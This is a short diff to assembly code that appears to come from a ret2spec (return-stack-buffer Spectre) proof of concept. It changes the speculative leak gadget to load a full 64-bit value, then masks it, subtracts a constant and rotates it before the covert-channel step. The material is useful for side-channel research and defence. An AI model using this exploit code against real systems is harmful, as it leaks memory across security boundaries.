@@ -20,6 +20,8 @@ ret2spec:
   movq %rsp, %rbp
 
   xor %rax, %rax
+  movq $0x00ffffffffffffff, %r8
+  movq $0x0000544552434553, %r9
 
   // This call actually modifies its return pointer to be at
   // ret2spec_end, so the instructions between the call and
@@ -27,7 +29,13 @@ ret2spec:
   call rsb_mispredict
   
   // Leak the value at (%rdi)
-  movb (%rdi), %al
+  mov (%rdi), %rax
+
+  // Do the mask and subtracting thing to make sure we
+  // actually leak the thing
+  andq %r8, %rax
+  subq %r9, %rax
+  ror $48, %rax
 
   // Covert channel for the leaked value
   // These two instructions are never actually executed, but are speculatively
